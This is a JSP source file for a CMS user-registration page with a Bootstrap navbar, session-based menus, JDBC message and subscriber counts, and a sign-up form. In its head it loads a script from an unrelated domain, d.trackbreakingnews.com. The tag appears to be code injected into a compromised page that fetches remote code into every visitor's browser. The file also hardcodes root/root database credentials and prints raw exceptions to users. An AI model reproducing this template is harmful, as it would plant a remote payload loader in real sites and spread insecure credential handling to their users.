<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@ page import="java.sql.*" %>
<%@ page import="java.io.*" %>
<%@ page import="javax.servlet.RequestDispatcher" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  <head>
  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Data</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Stylex.css" rel="stylesheet">
     <link href="CSS/Front04.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style type="text/css">
    .form-control{
    height: 30px;
    }
    .form-group{
    height: 40px;
    }
    .ZZZ {
    position: relative;
    top:-50px;
    }
    .FM h4 {
    font-size: 24px;
    font-weight: bold;
    }
    .mtx1zc {
    padding-left: 168px;
    }
    
     .mtx1zc1 {
    padding-left: 84px;
    }
    
     .mtx1zc2 {
    padding-left: ;
    }
    
     .mtx1zc3 {
    padding-left: 0px;
    }
    .SSv1x {
    margin-left: 45px;
    }
    
     .SSv3x {
    margin-left: 91px;
    }
    
     .SSv2x {
    margin-left: 27px;
    }
    .S00S {
    margin-left: 68px;
    }
    
    .S00S1 {
    margin-left: 48px;
    }
    .SS5 {
    margin-left: 90px;
    }
    .SS4 {
    margin-left: 120px;
    }
    .SS7 {
    margin-left: 114px;
    }
     .SS8 {
    margin-left: 122px;
    }
        .XZ {
  position:relative;
  right:100px;
  top:-50px;
  margin-left: 185px;

  }
    </style>
  </head>
  <body>	
  		
                  <div class="navbar navbar-inverse navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
					
						<li > <a href="Home2.jsp">Home</a></li>
					<li > <a href="Course1.jsp">Course</a></li>
					
					
				 <%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xuser");
                   		String ss2=(String) session.getAttribute("xmail");
						if(ss1==null && ss2==null){
                     %>
                     <li> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						else if(ss2==null && ss1!=null){%>
						
					<li> <a href="Profile.jsp">Data Records</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ss1 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						
						
                   <%
						 session=request.getSession();
                   		String ss=(String) session.getAttribute("xmail");
						if(ss!=null){
                     %>
                     
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li><a href="Msg3.jsp">Message <span class="badge"> <%=count %> </span></a></li>
					
					
						<%
						int count1=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count1++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li> <a href="Sub2.jsp">Subscribers<span class="badge"> <%=count1 %> </span></a></li>
                  
					<li class="dropdown">
					<a href="#" data-toggle="dropdown" class="dropdown-toggle">Contact Us <span class="caret"></span></a>
					<ul class="dropdown-menu">
					
						<li><a href="Owner1.jsp"><%=ss %></a></li>
						<li class="divider"></li>
						<li><a href="Forgot.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li><a href="index.html">Activity-Log</a></li>
						<li class="divider"></li>
						<li><a href="Logout.jsp">Logout</a></li>
					</UL>
						

					</li>
					<%
						}
					%>
					</ul>
	          </div> 
	      </div>
	  </div>
<br/><br/><br/><br/><br/>
<nav>
	<ul class="pager XZ">
    <li class="previous"><a href="Login1.jsp"><span >&larr;</span> Back</a></li>
    <li class="next"><a href="Home2.jsp"><span >&rarr;</span> Home</a></li>
  </ul>
</nav>
<div class="container ZZZ">
<div class="row ">
<div class="col-lg-3">
	<ul class="nav nav-pills nav-stacked ">
  <li role="presentation" class="active fadeInDown animated"><a href="Login1.jsp">Login</a></li>
  <li role="presentation" class=" fadeInDown animated"><a href="User.jsp">User Registration</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="About.jsp">About Us</a><hr></li>
</ul>
</div>
            <div class="container">
        <div class="row">
          <div class="col-lg-12 FM">
          <div class="panel panel-default">
            <div class="panel-heading">
              <h4>Please Register Here..</h4>
              </div>
              <div class="panel-body">
                <div class="well">
          <form method="post" action="User1.jsp" role="form">
            <div class="form-inline In">
              <div class="form-group">
                <label for="MyId"> First Name:</label>
                <input type="text" class="form-control SS" id="MyId" name="fn" placeholder="Enter First Name" required autofocus>
              </div>

            <div class="form-group">
              <label for="MyLname"> Email :</label>
              <input Type="email" class="form-control SS4" id="MyLname" name="em" placeholder="Enter Email" required autofocus> 
            </div> <br/>

     <div class="form-group">
              <label for="MyLname">Password :</label>
              <input Type="Password" class="form-control SS5" id="MyLname" name="ps" placeholder="Enter Passwrod" required autofocus> 
            </div>

     <div class="form-group">
              <label for="MyLname"> Re-Password :</label>
              <input Type="password" class="form-control SS6" id="MyLname" name="ps1" placeholder="Re-Enter Password" required autofocus> 
            </div> <br/>

            <div class="form-group" >
              <label for="Mycl">Gender</label>
              <select class="form-control SS7" name="gen">
                <option value="male">Male</option>
                <option value="female"> Female</option>
              </select>
            </div><br/>

            
            <div class="form-group">
              <label for="exampleInputPassword1"> Phone</label> 
              <input type="text" name="ph" class="form-control SS8" id="exampleInputPassword1" placeholder="Enter Phone" required autofocus>
              </div> <br/>
            </div>
           </div><br/>
              <div class="form-group">
              <button type="submit" class="btn btn-info btn-block BTNX"> Sign-Up</button> <br/>
             <br/>
         
                
            </div>
          </div>
        </div>
            
            </form>
          </div>
        </div>
      </div>
    </div> </div>  
			
<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div></div>

    <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
